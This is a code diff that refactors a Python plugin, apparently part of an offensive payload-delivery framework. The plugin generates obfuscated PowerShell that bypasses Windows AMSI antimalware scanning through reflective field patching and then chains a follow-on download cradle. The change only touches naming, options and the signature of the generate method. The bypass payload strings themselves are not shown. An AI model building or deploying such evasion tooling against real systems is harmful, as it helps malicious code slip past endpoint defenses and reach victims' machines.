@@ -1,13 +1,15 @@
 from plugins._base import BaseCradlePlugin
+from core.models import CradleInstance
 from core.obfuscate_getrandom import get_random_obfuscated_string as sgr
 
 
 class AmsiBypassPsSgr(BaseCradlePlugin):
-    NAME        = "amsi-bypass-ps-sgr"
+    NAME        = "amsi_bypass_ps_sgr"
     DESCRIPTION = "AMSI Bypass - Performs reflective field patching using SGR (Seeded Get-Random) obfuscated PowerShell"
     AUTHOR      = "CyberSecN00b"
 
     OPTIONS = {
+        **BaseCradlePlugin.OPTIONS,
         "BYPASS_METHOD": {
             "description": "AMSI bypass technique: amsiInitFailed | amsiContext",
             "default": "amsiInitFailed",
@@ -15,8 +17,8 @@ class AmsiBypassPsSgr(BaseCradlePlugin):
         }
     }
 
-    def generate(self, options: dict) -> str:
-        method  = options.get("BYPASS_METHOD", "amsiInitFailed").lower()
+    def generate(self, inst: CradleInstance) -> str:
+        method  = inst.options.get("BYPASS_METHOD", "amsiInitFailed").lower()
         payload = []
 
         if method == "amsicontext":
@@ -29,7 +31,7 @@ class AmsiBypassPsSgr(BaseCradlePlugin):
             )
 
         if self._endpoint_registry:
-            cradle_command = self._endpoint_registry.get_cradle_command(options.get("NEXT_CRADLE"))
+            cradle_command = self._endpoint_registry.get_cradle_command(inst.options.get("NEXT_CRADLE",0))
             if cradle_command:
                 payload.append(
                     cradle_command
